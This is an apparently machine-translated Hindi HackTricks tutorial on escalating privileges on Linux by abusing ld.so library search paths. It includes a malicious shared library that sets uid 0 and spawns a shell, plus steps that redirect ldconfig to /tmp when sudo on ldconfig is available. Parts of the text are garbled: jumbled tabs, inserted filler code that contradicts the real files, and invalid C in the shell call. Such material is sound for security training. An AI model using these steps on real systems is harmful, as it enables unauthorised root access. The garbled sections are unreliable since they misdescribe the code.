# ld.so निजी उन्नयन उदाहरण

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

## पर्यावरण को तैयार करें

निम्नलिखित खंड में आपको पर्यावरण को तैयार करने के लिए हमारे द्वारा उपयोग किए जाने वाले फ़ाइलों का कोड मिलेगा

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

यहां आपको libcustom.h फ़ाइल में एक उदाहरण दिया गया है जो एक लाइब्रेरी को लोड करने के लिए ld.so.conf फ़ाइल में जोड़ा जा सकता है। इस उदाहरण में, हमने /usr/local/lib डायरेक्टरी को लाइब्रेरी खोजने के लिए जोड़ा है। आप अपनी आवश्यकतानुसार इसे संशोधित कर सकते हैं।

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

यहां हम एक उदाहरण देखेंगे जहां हम एक नई लाइब्रेरी बना रहे हैं और इसे ld.so.conf फ़ाइल में जोड़ रहे हैं। इसके लिए, हम निम्नलिखित कदमों का पालन करेंगे:

1. पहले, हम एक नई C फ़ाइल बनाएंगे और उसे libcustom.c नाम देंगे।
2. फिर, हम इस फ़ाइल में नीचे दिए गए कोड को जोड़ेंगे:

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

3. अब, हम इस फ़ाइल को कंपाइल करेंगे और एक लाइब्रेरी फ़ाइल (libcustom.so) बनाएंगे। इसके लिए, हम निम्नलिखित कमांड का उपयोग करेंगे:

```bash
gcc -shared -o libcustom.so libcustom.c
```

4. अब, हम इस लाइब्रेरी फ़ाइल को /usr/local/lib या किसी अन्य लाइब्रेरी डायरेक्टरी में कॉपी करेंगे। इसके लिए, हम निम्नलिखित कमांड का उपयोग करेंगे:

```bash
sudo cp libcustom.so /usr/local/lib/
```

5. अब, हम ld.so.conf फ़ाइल को संपादित करेंगे और इसे नई लाइब्रेरी डायरेक्टरी के साथ अपडेट करेंगे। इसके लिए, हम निम्नलिखित कमांड का उपयोग करेंगे:

```bash
sudo echo "/usr/local/lib" >> /etc/ld.so.conf
```

6. अंत में, हम ldconfig कमांड का उपयोग करेंगे ताकि नई लाइब्रेरी डायरेक्टरी को लोड किया जा सके। इसके लिए, हम निम्नलिखित कमांड का उपयोग करेंगे:

```bash
sudo ldconfig
```

इसके बाद, आपकी नई लाइब्रेरी को उपयोग करने के लिए आपको अपने कोड में उसे शामिल करना होगा।

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Hindi" %}
1. अपनी मशीन में उन फ़ाइलों को **बनाएं** जो उसी फ़ोल्डर में हैं
2. **लाइब्रेरी को कंपाइल** करें: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` को `/usr/lib` में **कॉपी** करें: `sudo cp libcustom.so /usr/lib` (रूट अनुमतियाँ)
4. **एक्ज़ीक्यूटेबल को कंपाइल** करें: `gcc sharedvuln.c -o sharedvuln -lcustom`

### पर्यावरण की जांच करें

जांचें कि _libcustom.so_ _/usr/lib_ से **लोड** हो रहा है और आप बाइनरी को **एक्ज़ीक्यूट** कर सकते हैं।
{% endtab %}
{% endtabs %}
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## अधिकार उन्नयन

इस परिदृश्य में हम मान लेंगे कि **किसी ने _/etc/ld.so.conf/__ में एक संवेदनशील प्रविष्टि बनाई है**:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
विकल्पशील फ़ोल्डर _/home/ubuntu/lib_ है (जहां हमें लिखने योग्य पहुँच है)।\
**निम्नलिखित कोड को डाउनलोड और कंपाइल** करें उस पथ में:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
अब जब हमने **गलत रूप से कॉन्फ़िगर किए गए** पथ में एक खतरनाक libcustom पुस्तकालय बना ली है, हमें एक **रीबूट** का इंतजार करना होगा या रूट उपयोगकर्ता को **`ldconfig`** को निष्पादित करने के लिए (_यदि आप इस बाइनरी को **sudo** के रूप में निष्पादित कर सकते हैं या इसमें **suid bit** है तो आप इसे खुद निष्पादित कर सकेंगे_).

एक बार जब यह हो चुका है, **पुनः जांचें** कि `sharevuln` एक्सीक्यूटेबल किस स्थान से `libcustom.so` पुस्तकालय लोड कर रहा है:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
जैसा कि आप देख सकते हैं, यह **`/home/ubuntu/lib` से लोड हो रहा है** और यदि कोई उपयोगकर्ता इसे निष्पादित करता है, तो एक शैल निष्पादित होगा:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
ध्यान दें कि इस उदाहरण में हमने विशेषाधिकारों को बढ़ाने नहीं किया है, लेकिन कमांडों को संशोधित करने और **रूट या अन्य विशेषाधिकारी उपयोगकर्ता को विकलांग बाइनरी को निष्पादित करने के लिए प्रतीक्षा करने** के लिए हम विशेषाधिकारों को बढ़ा सकते हैं।
{% endhint %}

### अन्य गलतियाँ - समान दुर्बलता

पिछले उदाहरण में हमने एक ऐसी गलतिफहमी को बनाया जहां एक प्रशासक ने `/etc/ld.so.conf.d/` के अंदर एक गैर-विशेषाधिकृत फ़ोल्डर सेट किया था।\
लेकिन ऐसी अन्य गलतियाँ भी हो सकती हैं जो एक ही दुर्बलता का कारण बना सकती हैं, यदि आपके पास `/etc/ld.so.conf.d` के अंदर के कुछ **कॉन्फ़िगरेशन फ़ाइल** में **लिखने की अनुमति** है, `/etc/ld.so.conf.d` फ़ोल्डर में या `/etc/ld.so.conf` फ़ाइल में तो आप एक ही दुर्बलता को कॉन्फ़िगर कर सकते हैं और इसका शोषण कर सकते हैं।

## शोषण 2

**मान लें कि आपके पास `ldconfig` पर sudo विशेषाधिकार हैं**।\
आप `ldconfig` को इंडिकेट कर सकते हैं **कि कॉन्फ़ फ़ाइल्स को कहां से लोड करें**, इसलिए हम इसका लाभ उठा सकते हैं और `ldconfig` को विभिन्न फ़ोल्डर्स को लोड करने के लिए इस्तेमाल कर सकते हैं।\
इसलिए, चलो "/tmp" को लोड करने के लिए आवश्यक फ़ाइलें और फ़ोल्डर्स बनाते हैं:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
अब, जैसा कि **पिछले अपशब्द में दिखाया गया है**, **`/tmp` के अंदर दुष्ट पुस्तकालय बनाएं**।\
और अंत में, पथ को लोड करें और जांचें कि बाइनरी पुस्तकालय कहां से लोड हो रही है:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo विशेषाधिकार होने के कारण आप एक ही सुरक्षा कमजोरी का उपयोग कर सकते हैं।**

{% hint style="info" %}
मैंने एक विश्वसनीय तरीका नहीं पाया है जिससे `ldconfig` को **suid बिट** के साथ कमाया जा सके। निम्नलिखित त्रुटि प्रकट होती है: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## संदर्भ

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTB में Dab मशीन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
